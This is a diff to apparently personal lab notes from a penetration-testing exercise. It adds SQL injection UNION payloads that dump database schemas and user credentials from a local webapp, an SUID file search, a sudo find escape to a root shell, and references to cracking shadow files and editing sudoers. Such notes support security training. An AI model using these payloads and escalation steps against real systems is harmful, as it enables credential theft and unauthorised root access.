@@ -59,7 +59,9 @@ On WebApp webpage:
 http://127.0.0.1:8080/pick.php?product=7%2OR%201=1 (Vulnerable Option)
 http://127.0.0.1:8080/pick.php?product=7 UNION SELECT 1,2,3 
 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+Template based off Golden Statement (column,column,column FROM database.table)
 UNION SELECT user_id,username,name FROM siteusers.users;# ; obtain credentials and decode
+UNION SELECT 1,2,@@version
 
 On PFW terminal:
 Attempt to SSH to .181 using credentials; No user::cred works logging in
@@ -71,8 +73,8 @@ ssh -MS /tmp/T2 Aaron@127.0.0.1
 On new Round Sensor terminal:
 whoami && hostname
 bash
-sudo -l
-**GTFObins for anything found using sudo -l
+sudo -l + find / -type f -perm /2/*4*/6000 2>/dev/null
+**GTFObins for anything found using sudo -l or find / -type f -perm /2/4/6000 2>/dev/null
 sudo find . -exec /bin/bash \; -quit
 whoami
 ls -latr /root
@@ -141,6 +143,7 @@ On terminal:
 	
 	
 Exploit Development:
+Important resource website: wiremask.eu
 From Target:
 	scp <host>@<TargetIP>:<TargetFilePath>  <jumphost>@<IP>:<DestFilePath>	
 	
@@ -243,3 +246,6 @@ john shadow.txt --show
 sudo vim /etc/sudoers
 
 touch -t 
+
+Sights of Struggle:
+scp Command syntax
